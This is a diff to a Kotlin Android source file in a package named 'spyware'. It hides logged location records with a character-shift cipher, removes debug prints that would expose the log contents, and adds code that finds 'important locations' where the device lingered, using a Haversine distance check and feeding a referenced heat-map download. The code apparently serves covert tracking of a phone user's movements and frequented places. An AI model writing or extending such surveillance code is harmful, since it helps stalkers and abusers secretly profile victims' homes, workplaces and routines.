@@ -1,6 +1,6 @@
 import android.content.Context
 import android.os.Environment
-import android.widget.Toast
+import com.example.spyware.common.Constants.Companion.DISTINGUISHING_DISTANCE_KM
 import com.example.spyware.common.Constants.Companion.logShift
 import com.example.spyware.common.Constants.Companion.outputFileName
 import org.json.JSONObject
@@ -10,6 +10,8 @@ import java.io.FileInputStream
 import java.time.Instant
 import java.time.format.DateTimeFormatter
 import java.util.UUID
+import kotlin.math.atan2
+import kotlin.math.cos
 
 // Shift each character n places backward (encode)
 private fun shiftStringBack(str: String, n: Int): String {
@@ -60,14 +62,14 @@ fun readShiftedFromFile(location: File, fileName: String, n: Int): String? {
 fun appendShiftedToFile(location: File, fileName: String,data:String, n: Int) {
     val content:String?=readShiftedFromFile(location,fileName,n)
     val newContent = (content ?: "") + "\n" + data
-    println("Full Content: "+newContent)
+//    println("Full Content: "+newContent)
     writeShiftedToFile(location,fileName,newContent,n)
 }
 
 fun log(context:Context, jsonObject: JSONObject){
     val currentUtcTime = DateTimeFormatter.ISO_INSTANT.format(Instant.now())
     jsonObject.put("timestamp", currentUtcTime)
-    println(jsonObject.toString())
+//    println(jsonObject.toString())
     appendShiftedToFile(context.filesDir,outputFileName, jsonObject.toString(),logShift)
 }
 
@@ -78,6 +80,55 @@ fun log(context:Context, jsonObject: JSONObject){
 fun getErrorsFromLogs(context:Context): String {
     val content:String?=readShiftedFromFile(context.filesDir,outputFileName,logShift)
     return content?.lines()?.filter { it.contains("\"error\":\"") }?.joinToString("\n") ?: ""
+}
+
+fun getFilteredLogs(context:Context): String {
+    val content:String?=readShiftedFromFile(context.filesDir,outputFileName,logShift)
+    val locationLogs= content?.lines()?.filter { it.contains("\"latitude\":") }?.joinToString("\n") ?: ""
+    val result=getImportantLocations(locationLogs)
+    return result.joinToString { "\n" }
+}
+
+fun getImportantLocations(locationLogs:String): List<JSONObject> {
+    val locations= locationLogs.lines()
+        .filter { it.isNotBlank() } // Filter out empty lines
+        .mapNotNull {
+            try { JSONObject(it) }
+            catch (e: Exception) { null } // Handle potential JSON parsing errors
+        }
+
+    val result = mutableListOf<JSONObject>()
+    println("halo: ")
+    for (i in 0 until locations.size-4) {
+        if(calculateDistance(locations[i],locations[i+1])<DISTINGUISHING_DISTANCE_KM
+            &&calculateDistance(locations[i],locations[i+2])<DISTINGUISHING_DISTANCE_KM
+            && calculateDistance(locations[i],locations[i+3])<DISTINGUISHING_DISTANCE_KM
+            && calculateDistance(locations[i],locations[i+4])<DISTINGUISHING_DISTANCE_KM){
+            println("halo2: "+locations[i])
+            result.add(locations[i])
+        }
+    }
+    return result
+}
+
+fun calculateDistance(loc1:JSONObject,loc2:JSONObject):Double{
+    return calculateDistance(loc1.getDouble("latitude"),loc1.getDouble("longitude"),loc2.getDouble("latitude"),loc2.getDouble("longitude"))
+}
+
+// Function to calculate distance between two coordinates using Haversine formula
+fun calculateDistance(lat1: Double, lon1: Double, lat2: Double, lon2: Double): Double {
+    val r = 6371 // Radius of Earth in kilometers
+
+    val latDistance = Math.toRadians(lat2 - lat1)
+    val lonDistance = Math.toRadians(lon2 - lon1)
+
+    val a = kotlin.math.sin(latDistance / 2) * kotlin.math.sin(latDistance / 2) +
+            cos(Math.toRadians(lat1)) * cos(Math.toRadians(lat2)) *
+            kotlin.math.sin(lonDistance / 2) * kotlin.math.sin(lonDistance / 2)
+
+    val c = 2 * atan2(kotlin.math.sqrt(a), kotlin.math.sqrt(1 - a))
+    println(""+lat1+","+lon1+";"+lat2+","+lon2+":"+(r*c))
+    return r * c // Distance in kilometers
 }
 
 fun downloadHeatMap(context:Context){
